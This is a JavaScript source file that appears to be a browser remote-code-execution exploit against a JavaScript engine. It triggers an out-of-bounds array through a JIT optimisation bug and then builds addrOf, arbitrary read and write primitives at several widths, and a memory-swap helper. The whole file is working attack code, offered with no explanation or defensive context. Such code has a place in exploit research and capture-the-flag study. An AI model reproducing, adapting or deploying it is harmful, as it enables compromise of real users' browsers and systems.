function rce() {    
  let bs = new ArrayBuffer(8);
  let fs = new Float64Array(bs);
  let is = new BigUint64Array(bs);
  let us = new Uint32Array(bs);
  let u8 = new Uint8Array(bs);
  let u16 = new Uint16Array(bs);
  
  const ftoi = x => {
    fs[0] = x;
    return is[0];
  }
  
  const itof = x => {
    is[0] = x;
    return fs[0];
  }

  function myitof(_lower, _upper) {
    us[0] = Number(_lower);
    us[1] = Number(_upper);
    return fs[0];
  }

  function myftoi(_float) {
    fs[0] = _float;
    return [us[0], us[1]];
  }

  function myitof16(_0, _1, _2, _3) {
    u16[0] = Number(_0);
    u16[1] = Number(_1);
    u16[2] = Number(_2);
    u16[3] = Number(_3);
    return fs[0];
  }

  function myftoi16(_float) {
    fs[0] = _float;
    return [u16[0], u16[1], u16[2], u16[3]];
  }

  function myitof8(_0, _1, _2, _3, _4, _5, _6, _7) {
    u8[0] = Number(_0);
    u8[1] = Number(_1);
    u8[2] = Number(_2);
    u8[3] = Number(_3);
    u8[4] = Number(_4);
    u8[5] = Number(_5);
    u8[6] = Number(_6);
    u8[7] = Number(_7);
    return fs[0];
  }

  function myftoi8(_float) {
    fs[0] = _float;
    return [u8[0], u8[1], u8[2], u8[3], u8[4], u8[5], u8[6], u8[7]];
  }

  function foo() {
    let i = -Infinity;
    let j = 0;
    for (var k = 0; k < 1; k += i) {
      if (k == -Infinity)
        i = +Infinity;
  
      if (++j > 10)
        break;
    }
  
    let x = Math.max(k, 1024);
    x = -x;
    x = Math.max(x, -1025);
    x = -x;
    x -= 1022;
    x >>= 1;
    x += 10;
  
    let oob = Array(x);
    oob[0] = 1.1;
  
    let flt = [1.1,1.2,1.3,1.4];
    let tmp = {a: 1};
    let obj = [tmp,tmp,tmp,tmp];
  
    return { oob, flt, obj };
  }
  
  for (let i = 0; i < 100000; i++) foo();
  let { oob, flt, obj, dv, buf, viewToBuf } = foo();
  window.oob = oob
  window.flt = flt
  window.obj = obj;

  let flt_MAP = 17
  let flt_PROP = 18
  let flt_ELEM = 19
  let flt_LENG = 20
  
  let obj_MAP = 31
  let obj_PROP = 32
  let obj_ELEM = 33
  let obj_LENG = 34
  
  function addrOf(_object) {
    obj[0] = _object
    let backup = oob[obj_MAP]
    oob[obj_MAP] = oob[flt_MAP]
    let address = obj[0]
    oob[obj_MAP] = backup
    log(hex(ftoi(address)))
    return ftoi(address)
  }
  
  function read(_address) { 
    if (_address % 2n == 0) _address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let value = flt[0]
    oob[flt_ELEM] = backup 
    log(hex(ftoi(value)))
    return ftoi(value)
  }
  
  function write(_address, _value) {
    if (_address % 2n == 0) _address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    flt[0] = itof(_value)
    oob[flt_ELEM] = backup 
  }
  
  this._arb_writ = write
  this._arb_read = read
  this._addrOf = addrOf
    
  function read64(_address) { 
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let value = flt[0]
    oob[flt_ELEM] = backup // repairing it actually fks it up 
    //log(hex(ftoi(value)))
    return ftoi(value)
  }

  function read32(_address) { 
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let value = flt[0]
    oob[flt_ELEM] = backup 
    //log(hex(ftoi(value)))
    return Number(ftoi(value) & 0xFFFFFFFFn)
  }

  function read16(_address) { 
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let value = flt[0]
    oob[flt_ELEM] = backup 
    //log(hex(ftoi(value)))
    return Number(ftoi(value) & 0xFFFFn)
  }

  function read08(_address) { 
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let value = flt[0]
    oob[flt_ELEM] = backup 
    //log(hex(ftoi(value)))
    return Number(ftoi(value) & 0xFFn)
  }

  function addr0f(_object) {
    obj[0] = _object
    let backup = oob[obj_MAP]
    oob[obj_MAP] = oob[flt_MAP]
    let address = obj[0]
    oob[obj_MAP] = backup

    if (ftoi(address) % 2n == 0n) {
      return ftoi(address)
    } else {
      return ftoi(address)-1n // compressed pointer
    }
  }

  function write64(_address, _value) {
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    flt[0] = itof(_value);
    oob[flt_ELEM] = backup // repairing it actually fks it up 
    //log(hex(ftoi(value)))
    //return ftoi(value)
  }

  function write32(_address, _value) {
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let [_variable, _constant] = myftoi(flt[0]);
    flt[0] = myitof(_value, _constant)
    oob[flt_ELEM] = backup 
  }

  function write16(_address, _value) {
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let [_variable, _constant1, _constant2, _constant3] = myftoi16(flt[0]);
    flt[0] = myitof16(_value, _constant1, _constant2, _constant3)
    oob[flt_ELEM] = backup 
  }

  function write08(_address, _value) {
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let [_variable, _constant1, _constant2, _constant3, _constant4, _constant5, _constant6, _constant7] = myftoi8(flt[0]);
    flt[0] = myitof8(_value, _constant1, _constant2, _constant3, _constant4, _constant5, _constant6, _constant7)
    oob[flt_ELEM] = backup 
  }

  this.getUint64 = read64
  this.getUint32 = read32
  this.getUint16 = read16
  this.getUint8  = read08
  this.objToPtr  = addr0f
  this.setUint64 = write64
  this.setUint32 = write32
  this.setUint16 = write16
  this.setUint8  = write08

  /*
  let flt_MAP = 17
  let flt_PROP = 18
  let flt_ELEM = 19
  let flt_LENG = 20
  
  let obj_MAP = 31
  let obj_PROP = 32
  let obj_ELEM = 33
  let obj_LENG = 34
  */

  function __addr0f(_object) {
    obj[0] = _object
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = oob[obj_ELEM]
    let address = flt[0]
    //oob[obj_MAP] = backup
    if (ftoi(address) % 2n == 0n) {
      return ftoi(address)
    } else {
      return ftoi(address)-1n // compressed pointer
    }
  }

  function __read64(_address) { 
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let value = flt[0]
    //oob[flt_ELEM] = backup // repairing it actually fks it up 
    //log(hex(ftoi(value)))
    return ftoi(value)
  }

  function __read32(_address) { 
    //if (_address % 2n == 0) _address += 1n;
    //_address += 1n;
    let backup = oob[flt_ELEM]
    oob[flt_ELEM] = itof(_address-0x10n)
    let value = flt[0]
    //oob[flt_ELEM] = backup 
    //log(hex(ftoi(value)))
    return Number(ftoi(value) & 0xFFFFFFFFn)
  }

  this.getUint64_ = __read64
  this.getUint32_ = __read32
  this.objToPtr__ = __addr0f

  this.memswap = function(src, dst, size) {
    var i = 0n;
    while (size - i > 8n) {
      var tmp = this.getUint64(dst + i);
      this.setUint64(dst + i, this.getUint64(src + i));
      this.setUint64(src + i, tmp);
      i += 8n;
    }
    while (size - i > 0n) {
      var tmp = this.getUint8(dst + i);
      this.setUint8(dst + i, this.getUint8(src + i));
      this.setUint8(src + i, tmp);
      i += 1n;
    }
  }

  return this
}